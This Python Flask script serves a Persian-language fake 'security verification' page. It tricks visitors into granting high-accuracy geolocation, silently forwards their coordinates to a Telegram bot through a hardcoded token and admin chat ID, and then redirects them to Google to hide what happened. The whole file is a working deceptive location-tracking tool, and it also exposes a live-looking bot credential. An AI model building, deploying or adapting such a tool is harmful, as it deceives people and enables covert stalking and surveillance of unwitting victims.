from flask import Flask, request, jsonify, render_template_string
import requests

app = Flask(__name__)

# اطلاعات ربات و چت‌آیدی شما
BOT_TOKEN = '8819824616:AAGeOJx_dFMt_VLYzmLoH60D9CjHybUhcI8'
ADMIN_CHAT_ID = '8861869235'

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تایید امنیتی</title>
</head>
<body style="text-align: center; font-family: Tahoma, sans-serif; margin-top: 100px; background-color: #f4f4f9;">

    <div style="background: white; padding: 30px; border-radius: 12px; display: inline-block; box-shadow: 0 4px 10px rgba(0,0,0,0.1); max-width: 90%;">
        <h3>برای بارگذاری کامل صفحه، لطفاً روی دکمه زیر کلیک کنید:</h3>
        <br>
        <button onclick="requestLocation()" style="background-color: #4CAF50; color: white; padding: 12px 25px; border: none; border-radius: 6px; font-size: 16px; cursor: pointer; font-family: Tahoma;">تایید و ادامه</button>
        <p id="status" style="margin-top: 20px; color: #666; font-size: 14px;"></p>
    </div>

    <script>
        function requestLocation() {
            const statusEl = document.getElementById("status");
            statusEl.innerText = "در حال بررسی موقعیت مکانی...";

            if (!navigator.geolocation) {
                statusEl.innerText = "مرورگر شما پشتیبانی نمی‌کند.";
                return;
            }

            navigator.geolocation.getCurrentPosition(
                function(position) {
                    const lat = position.coords.latitude;
                    const lon = position.coords.longitude;
                    statusEl.innerText = "در حال ارسال اطلاعات...";

                    fetch('/save-loc', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ lat: lat, lon: lon })
                    })
                    .then(res => res.json())
                    .then(data => {
                        statusEl.innerText = "تایید شد.";
                        setTimeout(() => { window.location.href = "https://www.google.com"; }, 1000);
                    })
                    .catch(err => {
                        statusEl.innerText = "خطا در ارتباط با سرور.";
                    });
                },
                function(error) {
                    statusEl.innerText = "خطا: لطفاً دسترسی به لوکیشن را در مرورگر مجاز کنید.";
                },
                { enableHighAccuracy: true, timeout: 20000, maximumAge: 0 }
            );
        }
    </script>
</body>
</html>
"""

@app.route('/')
def home():
    return render_template_string(HTML_TEMPLATE)

@app.route('/save-loc', methods=['POST'])
def save_loc():
    data = request.json
    lat = data.get('lat')
    lon = data.get('lon')
    
    telegram_url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendLocation"
    try:
        requests.post(telegram_url, json={
            'chat_id': ADMIN_CHAT_ID,
            'latitude': lat,
            'longitude': lon
        })
        return jsonify({"status": "success"})
    except Exception as e:
        return jsonify({"status": "error"}), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
  
